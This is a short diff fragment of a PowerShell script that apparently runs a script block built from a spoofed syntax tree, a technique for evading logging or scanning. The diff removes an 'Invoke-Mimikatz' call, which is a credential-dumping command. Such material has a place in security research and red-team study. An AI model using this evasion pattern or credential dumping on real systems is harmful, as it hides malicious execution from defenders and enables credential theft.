@@ -10,5 +10,3 @@ $Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.E
 $Sb = $Ast.GetScriptBlock()
 
 & $Sb
-
-Invoke-Mimikatz
